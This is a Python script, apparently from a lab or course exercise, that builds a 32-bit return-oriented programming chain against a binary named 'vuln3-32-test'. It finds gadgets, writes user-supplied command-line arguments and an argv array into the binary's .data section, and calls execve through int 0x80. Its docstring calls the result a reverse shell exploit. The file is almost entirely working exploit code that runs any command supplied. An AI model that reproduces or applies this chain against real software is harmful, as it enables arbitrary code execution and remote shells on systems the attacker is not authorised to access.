import junk_length_and_addresses
import address_pop
from struct import pack
from get_gadgets import Gadget
import exploit_gadgets

binary_name = "vuln3-32-test"

rop = exploit_gadgets.ROPgadgets(binary_name)
# Macro definitions for ROP Gadgets
POPEDX    = Gadget("pop edx",pack('<I', rop.get_gadget("pop edx ; ret"))) # pop edx ; ret
POPEAX    = Gadget("pop eax",pack('<I', rop.get_gadget("pop eax ; ret"))) # pop eax ; ret
ADDEAXEDX = Gadget("add eax edx",pack('<I', rop.get_gadget("add eax, edx ; ret"))) # add eax, edx ; ret

MOVISTACK = Gadget("movistack",pack('<I', rop.get_gadget("mov dword ptr [edx], eax ; ret"))) # mov dword ptr [edx], eax ; ret
XOREAX    = Gadget("zero eax",pack('<I', rop.get_gadget("xor eax, eax ; ret"))) # xor eax, eax ; ret
INCEAX    = Gadget("inc eax",pack('<I', rop.get_gadget("inc eax ; ret"))) # inc eax ; ret
INCEBX    = Gadget("inc ebx",pack('<I', rop.get_gadget("inc ebx ; ret"))) # inc ebx ; ret

INCECX    = Gadget("inc ecx",pack('<I', rop.get_gadget("inc ecx ; ret"))) # inc ecx ; ret
DECEDX    = Gadget("dec edx",pack('<I', rop.get_gadget("dec edx ; ret"))) # dec edx ; ret
INT80     = Gadget("int 80",pack('<I', rop.get_gadget("int 0x80 ; ret"))) # int 0x80
NOP       = Gadget("nop",pack('<I', rop.get_gadget("nop ; ret"))) # nop
POPEBX    = Gadget("pop ebx",pack('<I', rop.get_gadget("pop ebx ; ret"))) # pop ebx ; ret
POPECXEBX = Gadget("pop ecx",pack('<I', rop.get_gadget("pop ecx ; pop ebx ; ret")),["ebx"]) # pop ecx ; pop ebx ; ret


def preprocess(p):
    """Helper function to preprocess command line arguments w.r.t. /

    :param p: The parameter to be preprocessed
    :return: The preprocessed command line argument
    """
    if '/' in p:
        result = ""
        subargs = p.split('/')
        for subarg in subargs:
            if subarg:
                while len(subarg) < 3:
                    subarg = '/' + subarg
                result += '/' + subarg
        return result
    return p


def create_stack_ropchain(cli_args, base_address):
    """Create the stack ROP chain

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The stack ROP chain packed bytes sequence
    """
    p = b''

    offset = 0
    size = len(cli_args)
    for index in range(size):
        if index > 0:
            offset += len(cli_args[index - 1]) + 1
        
        for j in range(len(cli_args[index]) // 4):
            p += address_pop.pop_reg(base_address + offset + j * 4,POPEDX,0,DECEDX,"dec")[0]

            p += POPEAX.gadget
            p += (cli_args[index][j * 4 : (j + 1) * 4]).encode('utf-8')
            p += MOVISTACK.gadget
        
        p += address_pop.pop_reg(base_address + offset + len(cli_args[index]),POPEDX,0,DECEDX,"dec")[0]

        p += XOREAX.gadget
        p += MOVISTACK.gadget
    
    return p


def create_shadow_stack_ropchain(cli_args, base_address, shadow_stack_offset):
    """Create the shadow stack ROP chain

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :param shadow_stack_offset: The offset used from the .data address to create the shadow stack
    :return: The shadow stack ROP chain packed bytes sequence
    """
    p = b''

    args_offset = 0
    shadow_offset = 0
    size = len(cli_args)
    
    for index in range(size):
        p += address_pop.pop_reg(base_address + args_offset,POPEAX,POPEDX,ADDEAXEDX,"add")[0]
        p += address_pop.pop_reg(base_address + shadow_stack_offset + shadow_offset,POPEDX,0,DECEDX,"dec")[0]
        p += MOVISTACK.gadget

        shadow_offset += 4
        args_offset += len(cli_args[index]) + 1
    
    return p


def rop_exploit(cli_args, base_address):
    """Create the full ROP chain reverse shell exploit

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The full ROP chain reverse shell exploit packed bytes sequence
    """
    (padding, data, bss) = junk_length_and_addresses.get_everything(binary_name)
    data += 160 # now contains a null byte
    print(f"{data:x}")
    STACK     = pack('<I', data)
    exploit = b'\x41' * padding

    exploit += create_stack_ropchain(cli_args,data)
    exploit += address_pop.pop_reg(data,POPEBX,0,INCEBX,"inc")[0]
    exploit += create_shadow_stack_ropchain(cli_args,data,60)
    

    exploit += address_pop.pop_reg(data + 60,POPECXEBX,0,INCECX,"inc")[0]
    # exploit += address_pop.pop_reg(data,NOP,0,INCEBX,"inc")
    exploit += address_pop.pop_reg(data,POPEBX,0,INCEBX,"inc")[0]

    exploit += address_pop.pop_reg(data + 48,POPEDX,0,DECEDX,"dec")[0]

    exploit += XOREAX.gadget # xor eax, eax ; ret
    exploit += INCEAX.gadget * 11 # inc eax ; ret 11 times
    exploit += INT80.gadget # int 0x80
    return exploit


def test():
    params = input("Enter exploit parameters: ")
    args = []
    for arg in params.split():
        args.append(preprocess(arg))

    fileName=input("Enter the file name: ")
    outfile=open(fileName, "wb")
    outfile.write(rop_exploit(args, 0x080da060))
    outfile.close()


if __name__ == "__main__":
    test()